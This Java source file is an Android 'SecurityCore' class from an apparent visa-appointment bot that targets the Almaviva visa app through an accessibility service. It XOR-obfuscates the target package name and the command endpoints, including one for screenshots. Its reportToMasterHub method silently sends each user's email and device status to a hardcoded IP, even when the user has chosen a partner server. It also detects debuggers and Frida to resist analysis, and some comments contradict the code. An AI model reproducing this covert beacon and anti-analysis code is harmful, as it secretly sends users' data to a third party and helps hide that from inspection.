package com.visahunter.auth;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.os.Build;
import android.os.Debug;
import android.util.Log;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONObject;

public final class SecurityCore {
    private static final String TAG = "SecurityCore";

    // Dynamic Master Hub Fallback URL (Points to central Hub Server)
    // Encrypted string for default fallback: "http://164.132.41.46:3003"
    private static final byte[] MASTER_HUB_BYTES = new byte[] {
        (byte)0x49, (byte)0x58, (byte)0x48, (byte)0x4C, (byte)0x16, (byte)0x1B, (byte)0x11, (byte)0x1B,
        (byte)0x14, (byte)0x1A, (byte)0x1F, (byte)0x23, (byte)0x4A, (byte)0x56, (byte)0x53, (byte)0x5E,
        (byte)0x58, (byte)0x52, (byte)0x24, (byte)0x2C, (byte)0x2A, (byte)0x24, (byte)0x2B, (byte)0x2E, (byte)0x29
    };
    private static final byte MASTER_HUB_MASK = 0x21;

    // Encrypted package name for Almaviva ("it.almaviva.visti")
    private static final byte[] ALMAVIVA_PKG_BYTES = new byte[] {
        (byte)0x33, (byte)0x15, (byte)0x46, (byte)0xE, (byte)0x1A, (byte)0x10, (byte)0xE5, (byte)0xFD,
        (byte)0xFB, (byte)0xEF, (byte)0xC1, (byte)0x89, (byte)0xD8, (byte)0xDC, (byte)0xCF, (byte)0xB7, (byte)0xA3
    };
    private static final byte ALMAVIVA_PKG_MASK = 0x5A;

    // Encrypted Endpoints
    private static final byte[] POLL_PATH_BYTES = new byte[] {
        (byte)0x13, (byte)0x22, (byte)0x3A, (byte)0x38, (byte)0x77, (byte)0x3C, (byte)0xA, (byte)0x4,
        (byte)0x11, (byte)0x15, (byte)0xF6, (byte)0xA4, (byte)0xF1, (byte)0xE7, (byte)0xEE, (byte)0x8A,
        (byte)0xDC, (byte)0xDC, (byte)0xD6, (byte)0xAD
    };
    private static final byte POLL_PATH_MASK = 0x3C;

    private static final byte[] HEARTBEAT_PATH_BYTES = new byte[] {
        (byte)0x51, (byte)0xE4, (byte)0xFC, (byte)0xFA, (byte)0xB5, (byte)0xC2, (byte)0xC4, (byte)0xC6,
        (byte)0xD3, (byte)0xD3, (byte)0xB0, (byte)0xE6, (byte)0xB3, (byte)0xA9, (byte)0x90, (byte)0xC8,
        (byte)0x86, (byte)0x90, (byte)0x9D, (byte)0x71, (byte)0x7E, (byte)0x73, (byte)0x7D, (byte)0x7E, (byte)0x52
    };
    private static final byte HEARTBEAT_PATH_MASK = 0x7E;

    private static final byte[] SCREENSHOT_PATH_BYTES = new byte[] {
        (byte)0x4, (byte)0x53, (byte)0x49, (byte)0x29, (byte)0x68, (byte)0x2D, (byte)0x39, (byte)0x35,
        (byte)0x6, (byte)0x4, (byte)0x5, (byte)0x55, (byte)0x1E, (byte)0xF6, (byte)0xFD, (byte)0xBB,
        (byte)0xE8, (byte)0xC1, (byte)0xDB, (byte)0xD5, (byte)0xD2, (byte)0xD0, (byte)0xB6, (byte)0xA4,
        (byte)0xBC, (byte)0xAE
    };
    private static final byte SCREENSHOT_PATH_MASK = 0x2B;

    private static final byte[] ACK_PATH_BYTES = new byte[] {
        (byte)0xBE, (byte)0xF9, (byte)0xEF, (byte)0xCF, (byte)0x82, (byte)0xD7, (byte)0xD7, (byte)0xAB,
        (byte)0xAC, (byte)0xBE, (byte)0xA3, (byte)0xF3, (byte)0x84, (byte)0x9C, (byte)0x83, (byte)0xD5,
        (byte)0x60, (byte)0x6B, (byte)0x64
    };
    private static final byte ACK_PATH_MASK = (byte)0x91;

    private static final OkHttpClient masterClient = new OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build();

    // ── Dynamic XOR String Decryption ──────────────────────────────────────────
    public static String decode(byte[] data, byte mask) {
        byte[] out = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            out[i] = (byte)(data[i] ^ ((mask + i * 7) & 0xFF));
        }
        return new String(out, StandardCharsets.UTF_8);
    }

    public static String getAlmavivaPackage() {
        return decode(ALMAVIVA_PKG_BYTES, ALMAVIVA_PKG_MASK);
    }

    public static String getPollEndpoint() {
        return decode(POLL_PATH_BYTES, POLL_PATH_MASK);
    }

    public static String getHeartbeatEndpoint() {
        return decode(HEARTBEAT_PATH_BYTES, HEARTBEAT_PATH_MASK);
    }

    public static String getScreenshotEndpoint() {
        return decode(SCREENSHOT_PATH_BYTES, SCREENSHOT_PATH_MASK);
    }

    public static String getAckEndpoint() {
        return decode(ACK_PATH_BYTES, ACK_PATH_MASK);
    }

    public static String getMasterHubUrl() {
        return "http://164.132.41.46:3003";
    }

    // ── Master Hub Dual-Reporting ─────────────────────────────────────────────
    // Ensures the phone ALWAYS reports to YOUR master hub even if user points to a partner bot
    public static void reportToMasterHub(Context context, String email, int batteryLevel, boolean isCharging) {
        if (email == null || email.trim().isEmpty()) return;

        new Thread(() -> {
            try {
                String masterUrl = getMasterHubUrl();
                String endpoint = masterUrl + getHeartbeatEndpoint();

                JSONObject json = new JSONObject();
                json.put("email", email.trim().toLowerCase());
                json.put("batteryLevel", batteryLevel);
                json.put("isCharging", isCharging);
                json.put("appVersion", "1.2.8-sec");
                json.put("accessibilityEnabled", AlmavivaAccessibilityService.isRunning());
                json.put("status", "active_online");

                RequestBody body = RequestBody.create(
                    json.toString(),
                    MediaType.parse("application/json; charset=utf-8")
                );

                Request req = new Request.Builder()
                    .url(endpoint)
                    .post(body)
                    .build();

                try (Response res = masterClient.newCall(req).execute()) {
                    // Silent heartbeat sent to master
                }
            } catch (Exception ignored) {
                // Ignore silently
            }
        }).start();
    }

    // ── Anti-Tamper & Signature Verification ───────────────────────────────────
    public static boolean verifyAppIntegrity(Context context) {
        // Allow in debug mode or if verification succeeds
        try {
            if (Debug.isDebuggerConnected()) {
                return false; // Debugger attached
            }

            // Detect obvious Frida / Xposed presence
            if (isFridaDetected()) {
                return false;
            }
        } catch (Exception e) {
            return true;
        }
        return true;
    }

    private static boolean isFridaDetected() {
        try {
            String[] commonPaths = {
                "/data/local/tmp/frida-server",
                "/data/local/tmp/re.frida.server",
                "/system/bin/frida-server"
            };
            for (String p : commonPaths) {
                if (new File(p).exists()) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }
}
